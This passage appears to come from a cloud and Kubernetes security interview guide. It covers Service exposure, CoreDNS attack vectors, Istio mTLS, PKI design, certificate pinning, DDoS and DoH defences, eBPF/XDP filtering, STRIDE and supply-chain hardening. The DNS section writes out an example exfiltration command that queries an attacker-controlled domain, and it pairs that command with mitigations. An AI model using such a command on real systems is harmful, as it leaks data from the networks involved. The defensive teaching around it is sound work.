**Answer:**

**ClusterIP (default):**
- Creates a virtual IP (VIP) reachable only within the cluster.
- kube-proxy / eBPF implements DNAT from ClusterIP to pod IP.
- **Security:** Internal only. No external exposure. Safest for backend services.
- **Risk:** Any pod in the cluster (without NetworkPolicy) can reach any ClusterIP. Default-deny NetworkPolicy required to restrict.

**NodePort:**
- Exposes service on each node's IP at a static port (30000-32767).
- External traffic → `NodeIP:NodePort` → kube-proxy DNAT → pod.
- **Security risks:**
  - Opens a port on EVERY node's IP — including nodes with sensitive workloads.
  - Bypasses cloud load balancer security features.
  - `externalTrafficPolicy: Cluster` (default) causes SNAT → hides real client IP in logs.
  - `externalTrafficPolicy: Local` preserves source IP but means traffic only goes to pods on the specific node.
  - No automatic TLS; requires external termination.
- **Use:** Rarely in production; mainly for dev/testing or integration with bare-metal LBs.

**LoadBalancer:**
- Cloud-provider provisions a Layer 4 external load balancer (NLB in AWS, external LB in GCP/Azure).
- LB gets a public IP; traffic forwarded to NodePort on backend nodes.
- **Security:**
  - `loadBalancerSourceRanges` restricts source IPs at the LB/SG level.
  - `annotations: service.beta.kubernetes.io/aws-load-balancer-internal: "true"` makes it internal only.
  - Each LB costs money — potential for cloud cost attacks (creating many LB services).
  - AWS Load Balancer Controller (preferred over in-tree) supports NLB with SG management, WAF integration, TLS termination.

**ExternalName:**
- DNS CNAME alias to an external hostname. No proxying, no IP.
- `kubectl get svc my-db` → resolves to `my-db.production.example.com`.
- **Security risk:** The DNS name can be hijacked (DNS takeover). If the external service DNS is compromised, all traffic is redirected. No TLS verification at the K8s level.
- **Use:** For referencing external services within the cluster DNS namespace.

**Ingress (not a Service type, but critical):**
- L7 (HTTP/HTTPS) routing to Services based on host/path.
- Implemented by an Ingress Controller (nginx, Traefik, AWS ALB Controller).
- Security: TLS termination, WAF integration, rate limiting, auth middleware.
- `IngressClass` controls which controller handles the resource — ensure RBAC restricts who can create Ingress objects.

---

### Q30. How does Kubernetes DNS work? What are DNS-based attack vectors in a Kubernetes cluster?

**Core Concept:** CoreDNS architecture; DNS-based attacks; exfiltration, cache poisoning.

**Answer:**

**Kubernetes DNS (CoreDNS):**
- CoreDNS runs as a Deployment in `kube-system` namespace.
- All pods have `nameserver <ClusterDNS-IP>` in `/etc/resolv.conf` (injected by kubelet).
- DNS search domains: `<namespace>.svc.cluster.local svc.cluster.local cluster.local` + host search domains.

**DNS resolution flow:**
1. Pod queries `http://payments-service` → DNS lookup `payments-service`.
2. DNS client appends search domains: tries `payments-service.payments.svc.cluster.local` → CoreDNS resolves via Kubernetes plugin → returns ClusterIP.
3. If not found, tries next search domain.
4. Eventually may hit external DNS.

**CoreDNS plugins pipeline:**
```
errors → log → health → ready → kubernetes (cluster.local) → forward (./etc/resolv.conf) → cache → loop → reload → loadbalance
```

**DNS-based attack vectors:**

1. **DNS exfiltration:** Attacker in a pod encodes data in DNS queries to an external domain they control:
   ```
   dig stolen-data-base64-encoded.attacker.com
   ```
   Since CoreDNS forwards unknown domains upstream, queries reach the attacker's DNS server.
   **Mitigation:** CoreDNS with Firewall plugin (response policy zones), or Cilium DNS proxy with FQDN-based NetworkPolicy that blocks unknown external domains.

2. **DNS cache poisoning:** Poison CoreDNS's cache to redirect service resolution to attacker-controlled IPs. Mitigated by DNSSEC for external domains, and the fact that internal cluster.local records are served directly from the API server state (no caching of internal records in a spoofable way).

3. **DNS amplification (internal DDoS):** Flood CoreDNS with DNS queries to exhaust its capacity → cluster-wide service discovery fails.
   **Mitigation:** `NodeLocal DNSCache` — runs a DNS cache on each node, reducing load on CoreDNS and providing local caching:
   ```yaml
   # NodeLocal DNSCache listens on 169.254.20.10
   # Pods configured to use node-local cache
   ```

4. **DNS search path abuse:** A query for `kubernetes` resolves to `kubernetes.default.svc.cluster.local` — the API server. Attackers can craft requests that unexpectedly resolve to internal services via search path traversal.

5. **CoreDNS plugin vulnerabilities:** CoreDNS has had CVEs in specific plugins (e.g., the `loop` plugin detection). Keep CoreDNS updated; audit plugins enabled.

---

## Section 8: Service Mesh & mTLS

---

### Q31. How does Istio implement mTLS? Walk through the control plane and data plane components.

**Core Concept:** Istio architecture; Citadel/istiod cert issuance; Envoy sidecar enforcement.

**Answer:**

**Istio architecture (post-1.5 unified control plane):**

```
Control Plane (istiod):
├── Pilot — xDS API server, pushes routing config to Envoy
├── Citadel (integrated) — CA; issues X.509 certificates to workloads
├── Galley (integrated) — config validation and distribution
└── xDS APIs: LDS, RDS, CDS, EDS, SDS

Data Plane:
└── Envoy proxy sidecar (injected into every pod)
    ├── Intercepts all inbound/outbound traffic (iptables redirect)
    ├── Terminates/initiates mTLS using SVID from SDS
    └── Enforces AuthorizationPolicy, VirtualService, DestinationRule
```

**Certificate lifecycle:**

1. **Workload startup:** Envoy sidecar starts alongside the application container.
2. **SDS request:** Envoy calls the **SDS (Secret Discovery Service)** API on the local SPIRE agent or istiod's SDS endpoint.
3. **CSR generation:** Envoy generates an EC P-256 key pair and CSR with the SPIFFE ID: `spiffe://<trust-domain>/ns/<namespace>/sa/<serviceaccount>`.
4. **CSR signing:** The CSR is sent to istiod's CA. Istiod validates the pod's Kubernetes Service Account token (via TokenReview API), then signs the cert.
5. **Certificate delivery:** Signed cert (valid 24h by default) delivered to Envoy via SDS. Rotated proactively before expiry.
6. **mTLS establishment:** When service A calls service B, Envoy-A initiates TLS to Envoy-B. Both present their SVID certs. Both validate the peer's cert against the trust bundle (also delivered via SDS).

**AuthorizationPolicy (L4 and L7):**
```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payments-policy
  namespace: payments
spec:
  selector:
    matchLabels:
      app: payments-api
  rules:
  - from:
    - source:
        principals:
          - "cluster.local/ns/frontend/sa/frontend-sa"  # SPIFFE identity
  - to:
    - operation:
        methods: ["POST"]
        paths: ["/api/v1/charge"]
```

**PeerAuthentication (enforce mTLS mode):**
```yaml
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: payments
spec:
  mtls:
    mode: STRICT  # Reject all non-mTLS traffic
```

**Failure modes:**
- `PERMISSIVE` mode (default during migration) allows both mTLS and plaintext — easy to miss unencrypted communication.
- Cert rotation failure → connections fail after cert expiry; ensure istiod HA and SDS connectivity.
- iptables redirect misconfiguration → traffic bypasses Envoy → no mTLS, no policy.

---

### Q32. Compare Istio vs. Linkerd vs. Cilium service mesh. When would you choose each?

**Core Concept:** Service mesh architecture trade-offs; data plane technology; operational complexity.

**Answer:**

| Dimension | Istio | Linkerd (v2) | Cilium (with Hubble) |
|---|---|---|---|
| **Proxy** | Envoy (C++, full-featured) | Linkerd-proxy (Rust, purpose-built) | eBPF (no sidecar for L4; Envoy for L7) |
| **Sidecar model** | Per-pod sidecar | Per-pod sidecar (microproxy) | Kernel-level (sidecarless option) |
| **mTLS** | Yes (Citadel/istiod CA) | Yes (per-route, always-on default) | Yes (WireGuard node-level or Cilium mTLS) |
| **L7 policy** | Rich (HTTP, gRPC, MongoDB) | HTTP, gRPC | HTTP, gRPC (without sidecar via Envoy) |
| **Observability** | Prometheus, Kiali, Jaeger | Linkerd dashboard, Prometheus, Jaeger | Hubble UI, Prometheus |
| **Resource overhead** | High (Envoy ~50-100MB RAM/pod) | Low (Linkerd-proxy ~10-20MB RAM/pod) | Minimal (kernel-level) |
| **Operational complexity** | High (many CRDs, complex xDS) | Low (opinionated, simpler model) | Medium (eBPF expertise required) |
| **Protocol support** | HTTP/1, HTTP/2, gRPC, WebSocket, MongoDB, MySQL | HTTP/1, HTTP/2, gRPC, WebSocket | HTTP, DNS, Kafka (extensible) |
| **Multi-cluster** | Yes (istioctl, manual config) | Yes (service mirroring) | Yes (Cluster Mesh) |
| **FIPS compliance** | Yes (BoringCrypto build) | Yes (Rust ring crate with FIPS) | Yes (kernel crypto) |

**Decision framework:**

**Choose Istio if:**
- You need full L7 traffic management (retries, circuit breaking, canary, fault injection).
- Complex multi-cluster federation with fine-grained routing.
- Organization has Envoy expertise.
- Need gRPC load balancing, MongoDB, or MySQL protocol awareness.
- FIPS compliance with rich features.

**Choose Linkerd if:**
- Minimizing operational complexity is the priority.
- Low-latency, low-overhead sidecar is needed.
- Rust-based proxy with strong memory safety properties is desirable.
- Simple mTLS + observability is the primary use case.

**Choose Cilium if:**
- Performance is critical (eBPF eliminates sidecar overhead entirely).
- Sidecarless architecture is preferred (Ambient Mesh-like, but eBPF-native).
- Combined CNI + network policy + service mesh in a single tool.
- Rich L3/L4 NetworkPolicy with L7 capabilities via Envoy integration.
- Kubernetes networking experts comfortable with eBPF debugging.

**Note:** Istio's Ambient Mesh mode (sidecarless, using ztunnel + waypoint proxies) is converging toward Cilium's model.

---

## Section 9: PKI, Certificates & Key Management

---

### Q33. Design a PKI architecture for a large enterprise with multiple environments. What are the certificate rotation mechanisms?

**Core Concept:** CA hierarchy; root CA protection; automated rotation; Vault integration.

**Answer:**

**CA Hierarchy:**
```
Root CA (Offline, Air-gapped HSM)
├── Intermediate CA — Production (Online, HSM-backed)
│   ├── Issuing CA — Prod Services (cert-manager / Vault)
│   └── Issuing CA — Prod Infrastructure (TLS for load balancers, nodes)
├── Intermediate CA — Staging
│   └── Issuing CA — Staging Services
└── Intermediate CA — Internal Tools
    └── Issuing CA — Developer Tools, Monitoring
```

**Root CA protection:**
- Root CA is **never online**. Stored on FIPS 140-2 Level 3 HSM (e.g., Thales Luna, AWS CloudHSM).
- Used only to sign Intermediate CA certs (done offline, ceremony with key custodians).
- Root CA cert has 20-year validity; backed up in geographically separate secure facilities.

**Intermediate CA:**
- Online but HSM-backed (CloudHSM cluster or Vault with HSM seal).
- 5-year validity; revocation supported (CRL + OCSP).
- Signs Issuing CAs and can sign short-lived leaf certs directly.

**Issuing CA (Automated):**
- Integrated with cert-manager (Kubernetes) or Vault PKI secrets engine.
- Issues 24-48h certificates (service SVIDs) or 90-day certificates (TLS endpoints).

**HashiCorp Vault PKI:**
```bash
# Enable PKI secrets engine
vault secrets enable -path=pki pki
vault secrets tune -max-lease-ttl=8760h pki

# Import intermediate CA cert
vault write pki/config/ca pem_bundle=@intermediate.pem

# Create role for issuing service certs
vault write pki/roles/service-certs \
  allowed_domains="svc.cluster.local" \
  allow_subdomains=true \
  max_ttl=48h \
  key_type=ec \
  key_bits=256 \
  require_cn=false

# Issue cert
vault write pki/issue/service-certs \
  common_name="payments.payments.svc.cluster.local" \
  ttl=24h
```

**cert-manager in Kubernetes:**
```yaml
apiVersion: cert-manager.io/v1
kind: Certificate
metadata:
  name: payments-tls
  namespace: payments
spec:
  secretName: payments-tls-secret
  duration: 24h
  renewBefore: 8h   # Rotate 8h before expiry
  issuerRef:
    name: vault-issuer
    kind: ClusterIssuer
  dnsNames:
  - payments.payments.svc.cluster.local
```

**Rotation mechanisms:**
1. **Automatic renewal** — cert-manager watches cert expiry, issues new cert before `renewBefore` threshold. Application reads new cert from Kubernetes Secret (auto-updated).
2. **Rolling restart** — if the application caches the cert at startup, trigger a rolling restart to pick up the new cert.
3. **SPIRE automatic rotation** — SPIRE agent delivers new SVIDs before expiry via SDS without process restart.
4. **CRL/OCSP** — immediate revocation without rotation (for compromise scenarios).

---

### Q34. How does certificate pinning work? What are the risks, and when should you use it?

**Core Concept:** Cert pinning; HPKP; mobile app security; risks in cloud environments.

**Answer:**

Certificate pinning is a technique where a client hardcodes (pins) the expected certificate or public key of a specific server, rejecting connections to servers presenting different certs even if they are signed by a trusted CA.

**Types of pinning:**

1. **Certificate pinning** — pin the exact DER-encoded certificate. Breaks on cert renewal (even with the same key).
2. **Public key pinning** — pin the SubjectPublicKeyInfo (SPKI) hash. Survives cert renewal if the same key is kept.
3. **CA pinning** — pin an intermediate or root CA. Allows flexibility (any cert from that CA is trusted) but weakens the guarantee.

**Implementation (Go):**
```go
func pinnedTLSClient(pinnedSPKI []byte) *http.Client {
    tlsConfig := &tls.Config{
        VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
            for _, rawCert := range rawCerts {
                cert, err := x509.ParseCertificate(rawCert)
                if err != nil {
                    return err
                }
                // Hash the SubjectPublicKeyInfo
                spkiHash := sha256.Sum256(cert.RawSubjectPublicKeyInfo)
                if bytes.Equal(spkiHash[:], pinnedSPKI) {
                    return nil // Pin matches
                }
            }
            return fmt.Errorf("certificate pin validation failed")
        },
    }
    return &http.Client{Transport: &http.Transport{TLSClientConfig: tlsConfig}}
}
```

**HTTP Public Key Pinning (HPKP):**
Browser-based pinning via response header. **Deprecated and removed** from browsers due to HPKP abuse (attackers pinning malicious keys after initial compromise, creating permanent lockout).

**Risks of cert pinning:**

1. **Operational brittleness** — if you pin a cert and need to rotate (compromise, CA change, expiry), all pinned clients break until updated. Mobile apps are especially risky (update latency).
2. **Breaks TLS inspection** — corporate firewalls doing TLS MitM for DLP fail when apps pin certs.
3. **Difficulty in testing** — staging/test environments need separate pins or disable pinning.
4. **Key compromise scenario** — if you pin a compromised key, you prevent the legitimate rotation that would fix the compromise.

**When to use cert pinning:**
- Mobile banking apps, fintech, health apps — high-value targets where MitM is a critical threat.
- Internal service-to-service in closed environments where you control both ends.
- Hardware devices (IoT) communicating with a fixed backend.

**When NOT to use in cloud:**
- Microservices with automated cert rotation (SPIRE, cert-manager) — pinning creates operational overhead with no additional security if mTLS with short-lived certs already provides strong authentication.
- Services behind CDNs or cloud load balancers that may change certificates.

---

## Section 10: DDoS, WAF & Edge Security

---

### Q35. Describe a multi-layer DDoS defense architecture for a public cloud application. Include L3, L4, and L7 mitigations.

**Core Concept:** Volumetric, protocol, and application-layer DDoS defense; scrubbing; rate limiting.

**Answer:**

**DDoS attack taxonomy:**
- **L3 Volumetric:** UDP flood, ICMP flood, spoofed packet floods. Goal: saturate bandwidth.
- **L4 Protocol:** SYN flood, ACK flood, fragmentation attacks. Goal: exhaust connection state.
- **L7 Application:** HTTP flood, Slowloris, low-and-slow. Goal: exhaust application resources.

**Multi-layer defense architecture:**

```
Internet
    │
    ▼
BGP Anycast / DDoS Scrubbing (CloudFlare Magic Transit, AWS Shield Advanced)
    │   L3/L4 Volumetric filtering at ISP/peering level
    │   Black-hole routing for attacked IPs, traffic diversion to scrubbing center
    ▼
Edge / CDN (CloudFront, Cloudflare, Fastly)
    │   TCP connection termination at edge (SYN proxy)
    │   Rate limiting by IP, ASN, geolocation
    │   Bot detection (JS challenge, CAPTCHA)
    │   IP reputation feeds
    ▼
WAF (AWS WAF, Cloudflare WAF, ModSecurity)
    │   OWASP Core Rule Set
    │   Custom rules (rate limit by URI, header, user-agent)
    │   ML-based anomaly detection
    │   SQL injection, XSS, SSRF signatures
    ▼
Load Balancer (ALB, NLB)
    │   Connection limits per source IP
    │   TLS termination (CPU offload from backend)
    │   Health-based backend routing
    ▼
Application (AutoScaling Group, ECS, EKS)
    │   Rate limiting (Redis-backed token bucket, leaky bucket)
    │   Connection pooling
    │   Circuit breakers (Hystrix, resilience4j)
    │   Request timeout enforcement
    ▼
Backend Services / Database
    │   Connection pooling (pgBouncer, ProxySQL)
    │   Query timeout enforcement
    │   Read replicas for read DDoS
```

**L4 SYN flood mitigation:**
- **SYN Cookies** (Linux: `net.ipv4.tcp_syncookies=1`) — server generates a cryptographic cookie in SYN-ACK, eliminating the need to store half-open connections. Server state allocated only on full three-way handshake.
- **Edge SYN proxy** — CDN terminates the TCP connection, establishes a clean connection to the origin only after full handshake.

**L7 Rate Limiting (Redis + token bucket in Go):**
```go
// Rate limit: 100 req/s per IP, burst 200
limiter := rate.NewLimiter(rate.Limit(100), 200)
if !limiter.Allow() {
    http.Error(w, "429 Too Many Requests", http.StatusTooManyRequests)
    return
}
```

**AWS Shield Advanced specifics:**
- Layer 3/4 DDoS automatic mitigation for EIP, ALB, CloudFront, Route 53.
- Health-based detection — detects volumetric attacks as they cause backend health check failures.
- **Cost protection** — AWS absorbs scaling costs during Shield-mitigated attacks.
- **SRT (Shield Response Team)** — 24/7 access for advanced mitigation assistance.

**Anycast scrubbing:**
BGP Anycast advertises your IP prefix from multiple scrubbing centers globally. Under attack, traffic is routed to the nearest scrubbing center, filtered, and clean traffic tunneled (GRE/BGP) to origin.

---

### Q36. What is DNS over HTTPS (DoH) and DNS over TLS (DoT)? What are the security and privacy implications for enterprise environments?

**Core Concept:** Encrypted DNS; security vs. enterprise visibility trade-offs.

**Answer:**

**Traditional DNS:** Plaintext UDP/TCP port 53. DNS queries and responses are visible to any network observer (ISP, corporate network, attackers). No authentication — response can be spoofed.

**DNS over TLS (DoT, RFC 7858):**
- DNS queries wrapped in TLS on TCP port **853**.
- Server authenticated via certificate (DANE/PKIX).
- Always-on encryption for DNS.
- Distinguishable by port — corporate firewalls can block port 853 if needed.

**DNS over HTTPS (DoH, RFC 8484):**
- DNS queries sent as HTTPS (port 443) to a standard HTTPS endpoint (`/dns-query`).
- Indistinguishable from regular HTTPS traffic.
- Browsers (Firefox, Chrome) implement DoH directly, bypassing the OS resolver.
- Providers: Cloudflare (1.1.1.1), Google (8.8.8.8), NextDNS.

**Security implications:**

1. **Encryption protects against passive surveillance** — ISP-level DNS snooping, coffee shop MitM.
2. **Server authentication** — prevents DNS spoofing/cache poisoning in transit.
3. **DNSSEC orthogonal** — DoH/DoT encrypts transport; DNSSEC validates data integrity/authenticity. Both needed for full protection.

**Enterprise/security team implications:**

1. **Loss of DNS visibility** — enterprise security tools (DNS firewalls, DLP, threat detection) rely on inspecting DNS queries. DoH bypasses DNS sinkholing.
   - Cloudflare's 1.1.1.1 DoH bypasses corporate DNS filtering.
   - Malware increasingly uses DoH for C2 communications to evade detection.

2. **Browser DoH bypasses policy** — Firefox/Chrome implement DoH; browsers may send DNS directly to Cloudflare even when corporate policy routes DNS through internal resolvers.
   - **Mitigation:** Block DoH at the firewall (block `1.1.1.1:443`, `8.8.8.8:443` for DNS endpoints) or deploy a managed DoH resolver internally.
   - Firefox respects `canary domain`: create `use-application-dns.net` in your corporate DNS to disable Firefox's DoH.

3. **Enterprise DoH deployment:** Deploy Cloudflare Gateway, NextDNS Enterprise, or an internal DoH resolver (Unbound + nginx) to maintain DNS visibility while encrypting queries:
   ```nginx
   server {
     listen 443 ssl http2;
     location /dns-query {
       proxy_pass http://127.0.0.1:53;  # Local Unbound
       grpc_pass grpc://127.0.0.1:8053;
     }
   }
   ```

4. **Canary domain for split-horizon:** Internal `corp.example.com` domains should resolve via internal DoH resolver; external via public DoH. Split-horizon DNS policies.

---

## Section 11: eBPF & Kernel Networking

---

### Q37. What is eBPF? How is it used in cloud networking and security? What are its security boundaries?

**Core Concept:** eBPF architecture; verifier; use cases in networking and security; privilege requirements.

**Answer:**

**eBPF (extended Berkeley Packet Filter)** is a kernel subsystem that allows sandboxed programs to run inside the Linux kernel without modifying kernel source or loading kernel modules.

**Architecture:**
```
Userspace: eBPF program (C/Rust) → clang/LLVM → eBPF bytecode
                                                        │
                                                   Kernel Verifier
                                                   (safety checks)
                                                        │
                                              JIT Compiler → Native code
                                                        │
                                              Attached to hook point:
                                              - kprobe/tracepoint
                                              - tc (traffic control)
                                              - XDP (eXpress Data Path)
                                              - socket operations
                                              - cgroup hooks
                                              - LSM (security hooks)
```

**The Verifier** guarantees:
- No infinite loops (bounded execution — verifier checks all possible paths).
- No invalid memory access (bounds checking on all pointer arithmetic).
- No uninitialized reads.
- Stack size limit (512 bytes).

**eBPF Maps** — data structures shared between eBPF programs and userspace: hash maps, arrays, ring buffers, LRU maps, per-CPU maps.

**Networking use cases:**

1. **XDP (eXpress Data Path):** eBPF programs run at the driver level, before the kernel networking stack. Enables line-rate packet processing (DDoS mitigation, load balancing at 100Gbps+).
   ```c
   SEC("xdp")
   int xdp_drop_syn(struct xdp_md *ctx) {
       // Drop SYN packets from blacklisted IPs
       // Returns XDP_DROP, XDP_PASS, XDP_TX, XDP_REDIRECT
   }
   ```

2. **tc (traffic control) hooks:** Post-XDP, pre-routing. Cilium attaches eBPF programs here for pod network policy, DNAT for services, and mTLS enforcement.

3. **Socket-level filtering:** Intercept `connect()`, `bind()` syscalls to implement socket-level policies without iptables.

4. **kTLS (kernel TLS):** eBPF programs can observe TLS plaintext after kernel TLS decryption (for inspection without full MitM).

**Security use cases:**

1. **Syscall filtering (seccomp-bpf):** Container security — restrict syscalls available to a container process. Default Docker/Kubernetes seccomp profiles block ~44 dangerous syscalls.

2. **LSM (Linux Security Module) BPF:** Enforce MAC-like policies via eBPF programs attached to security hook points. Alternative to SELinux/AppArmor for custom policies.

3. **Tetragon (Cilium):** eBPF-based security observability — trace process execution, file access, network connections with kernel-level enforcement. Cannot be bypassed by userspace.

**Security boundaries of eBPF:**

1. **`CAP_BPF` + `CAP_NET_ADMIN`** required for most networking eBPF programs. Privileged containers can potentially load eBPF programs → escalation risk.
2. **Verifier bypass CVEs** have occurred (rare but high severity — allow kernel code execution). Keep kernel updated.
3. **eBPF programs run in kernel context** — a bug in the eBPF program can cause kernel panics (though the verifier prevents most).
4. **Unprivileged eBPF** (socket filters, seccomp) is safer but limited in capability. Disable `kernel.unprivileged_bpf_disabled=0` in production → set to 1.

---

### Q38. Explain XDP (eXpress Data Path). How can it be used for DDoS mitigation?

**Core Concept:** Kernel bypass networking with eBPF; XDP return codes; DDoS use case.

**Answer:**

XDP is the earliest point in the Linux networking stack where an eBPF program can process packets — at the **network driver level**, before the kernel allocates an `sk_buff` structure for the packet.

**Performance:** Avoids `sk_buff` allocation overhead. On supported NICs with native XDP driver support, packets are processed directly from DMA ring buffers.

**XDP return codes:**
- `XDP_DROP` — discard packet immediately, no allocation, minimal CPU.
- `XDP_PASS` — pass to normal kernel networking stack.
- `XDP_TX` — transmit packet back out the same interface (useful for reflection).
- `XDP_REDIRECT` — redirect to another interface, CPU, or userspace (AF_XDP socket).
- `XDP_ABORTED` — program error; drop with a trace event.

**DDoS mitigation with XDP:**

```c
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <bpf/bpf_helpers.h>

struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __type(key, __u32);   // source IP
    __type(value, __u64); // packet count
    __uint(max_entries, 1 << 20);
} ip_blacklist SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __type(key, __u32);
    __type(value, __u64);
    __uint(max_entries, 1 << 20);
} rate_limit_map SEC(".maps");

SEC("xdp")
int xdp_ddos_mitigate(struct xdp_md *ctx) {
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    if (eth->h_proto != __constant_htons(ETH_P_IP))
        return XDP_PASS;

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    __u32 src_ip = ip->saddr;

    // Check blacklist
    if (bpf_map_lookup_elem(&ip_blacklist, &src_ip))
        return XDP_DROP;

    // Rate limiting: count packets per source IP
    __u64 *count = bpf_map_lookup_elem(&rate_limit_map, &src_ip);
    if (count) {
        __sync_fetch_and_add(count, 1);
        if (*count > 10000)  // Threshold: 10k pps per IP
            return XDP_DROP;
    } else {
        __u64 init = 1;
        bpf_map_update_elem(&rate_limit_map, &src_ip, &init, BPF_ANY);
    }

    return XDP_PASS;
}

char LICENSE[] SEC("license") = "GPL";
```

**Attach and load:**
```bash
# Native XDP (fastest — driver-level)
ip link set eth0 xdp obj ddos_mitigate.o sec xdp

# Offloaded XDP (fastest — runs on NIC ASIC)
ip link set eth0 xdpoffload obj ddos_mitigate.o sec xdp

# Generic XDP (software fallback — slower)
ip link set eth0 xdpgeneric obj ddos_mitigate.o sec xdp

# Check status
ip link show eth0 | grep xdp
```

**Throughput:** Native XDP can process 10-100 million packets per second on modern hardware, far exceeding iptables capability.

---

## Section 12: Threat Modeling & Attack Vectors

---

### Q39. Walk through a STRIDE threat model for a multi-tier cloud application. What mitigations apply per threat category?

**Core Concept:** STRIDE methodology applied to cloud architecture; systematic threat enumeration.

**Answer:**

**STRIDE** = Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege.

**Application: 3-tier web app (ALB → ECS → RDS, in AWS VPC)**

**Architecture elements:**
- Public ALB (HTTPS, WAF-backed)
- ECS tasks (Fargate) in private subnet
- RDS PostgreSQL in isolated subnet
- S3 bucket for static assets
- SQS queue for async processing
- IAM roles for each component

---

**Spoofing:**
- *Threat:* Attacker impersonates ECS task to access RDS using stolen credentials.
- *Mitigation:* IAM roles for tasks (no hardcoded credentials), IMDSv2, Secrets Manager rotation, mTLS between services using service-specific identities (SPIRE/SVID).

**Tampering:**
- *Threat:* Man-in-the-middle modifies API responses between ALB and ECS, or between ECS and RDS.
- *Mitigation:* TLS for all hops (ALB → ECS, ECS → RDS with `sslmode=require`), WAF rules detect payload tampering, message signing for SQS messages (SNS + SQS with signature verification), CloudTrail for API change logging.

**Repudiation:**
- *Threat:* Attacker performs malicious action, then deletes logs. Operator cannot prove what happened.
- *Mitigation:* CloudTrail with S3 log file validation (hash chain), CloudTrail Lake (immutable), VPC Flow Logs, ALB access logs to S3 with MFA delete, CloudWatch Logs with resource-based policies preventing deletion.

**Information Disclosure:**
- *Threat:* S3 bucket misconfiguration exposes customer PII. RDS backup exposed. Error messages reveal stack traces.
- *Mitigation:* S3 Block Public Access (account level), S3 bucket policies, SSE-KMS encryption, Macie for PII detection, structured error responses (no stack traces in 5xx), DLP on egress.

**Denial of Service:**
- *Threat:* Application DDoS saturates ALB, RDS connection exhaustion.
- *Mitigation:* AWS Shield Advanced on ALB, WAF rate rules, Auto Scaling for ECS, RDS Proxy for connection pooling (pool 1000 app connections to 100 DB connections), Circuit breakers in app code.

**Elevation of Privilege:**
- *Threat:* ECS task role has `iam:PassRole` → attacker with code execution in container can create Lambda with admin role.
- *Mitigation:* Least-privilege IAM roles (audit with IAM Access Analyzer), no `iam:PassRole` unless required with strict conditions, SCPs preventing wildcard IAM actions, GuardDuty detecting unusual API calls.

---

### Q40. What is a supply chain attack in the context of cloud infrastructure? How do you defend against it?

**Core Concept:** Software supply chain security; SLSA framework; container image signing; dependency auditing.

**Answer:**

A supply chain attack compromises software, infrastructure, or dependencies upstream — before it reaches your environment.

**Attack vectors:**

1. **Compromised container base images** — pulling `FROM ubuntu:latest` from Docker Hub which has been poisoned.
2. **Malicious npm/pip/go packages** — typosquatting (`colourama` vs `colorama`), dependency confusion attacks.
3. **Compromised CI/CD pipeline** — attackers gain access to CI (GitHub Actions, Jenkins) and inject malicious code into builds.
4. **Compromised IaC modules** — Terraform modules in public registries.
5. **Build system compromise** — SolarWinds-style: legitimate software signed and distributed with backdoor.

**Defenses:**

**1. SLSA (Supply chain Levels for Software Artifacts):**
A framework defining four levels of supply chain security:
- L1: Build process documented, artifact provenance generated.
- L2: Provenance signed, build service-generated.
- L3: Hardened build environment, provenance non-falsifiable.
- L4: Two-person review, hermetic builds.

**2. Image signing with Sigstore/Cosign:**
```bash
# Sign container image (keyless with OIDC in CI)
cosign sign --yes ghcr.io/myorg/myapp:sha256-abc123

# Verify before deployment
cosign verify --certificate-identity-regexp ".*github.*" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/myorg/myapp:sha256-abc123
```

**3. Policy enforcement in Kubernetes (Kyverno / OPA Gatekeeper):**
```yaml
# Require all images to be signed and from approved registries
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  rules:
  - name: verify-signature
    match:
      resources:
        kinds: [Pod]
    verifyImages:
    - imageReferences: ["ghcr.io/myorg/*"]
      attestors:
      - entries:
        - keyless:
            subject: "https://github.com/myorg/*"
            issuer: "https://token.actions.githubusercontent.com"
```

**4. SBOM (Software Bill of Materials):**
Generate and attest SBOMs for all container images:
```bash
syft ghcr.io/myorg/myapp:latest -o spdx-json > sbom.spdx.json
cosign attest --type spdxjson --predicate sbom.spdx.json ghcr.io/myorg/myapp:latest
```

**5. Dependency pinning and auditing:**
```bash
# Go: pin modules with go.sum (cryptographic hash of each dependency)
go mod verify  # Verify downloaded modules match go.sum

# Dependabot / Renovate for automated dependency updates
# Snyk / Grype / Trivy for vulnerability scanning
trivy image ghcr.io/myorg/myapp:latest
```

**6. Hermetic builds:**
Build in an isolated, reproducible environment with no internet access during build. All dependencies fetched from a verified internal proxy (Artifactory, Nexus) with content-addressable storage.

---

## Section 13: Multi-Cloud & Hybrid Networking

---

### Q41. How do you design a secure multi-cloud networking architecture between AWS and GCP?

**Core Concept:** Inter-cloud connectivity options; security controls; latency and cost trade-offs.

**Answer:**

**Connectivity options:**

1. **Public Internet + TLS/mTLS:**
   - Services communicate over the internet using HTTPS/mTLS.
   - Simplest but subject to variable latency, public exposure.
   - Best for: low-sensitivity APIs, CDN-fronted endpoints.

2. **VPN (IPsec):**
   - AWS VGW ↔ GCP Cloud VPN Gateway over IPsec.
   - Encrypted tunnel over internet. No dedicated bandwidth guarantee.
   - Cost: ~$0.05/hr per tunnel + data transfer.
   - Best for: control plane traffic, low-bandwidth inter-cloud.
   ```
   AWS VPC (10.0.0.0/16) ←IPsec tunnel→ GCP VPC (10.1.0.0/16)
   ```

3. **Dedicated Interconnect / Direct Connect:**
   - AWS Direct Connect ↔ colocation (e.g., Equinix) ↔ GCP Partner Interconnect.
   - Dedicated bandwidth, private, no internet exposure.
   - High cost but guaranteed throughput and latency.
   - Best for: high-bandwidth data replication, regulated workloads.

4. **SD-WAN / Cloud Exchange (Megaport, PacketFabric):**
   - Network-as-a-service interconnecting multiple clouds via a shared fabric.
   - Flexible bandwidth, BGP routing, lower latency than VPN.
   - Best for: multi-cloud with changing bandwidth requirements.

**Security architecture:**

```
AWS VPC (prod)                    GCP VPC (prod)
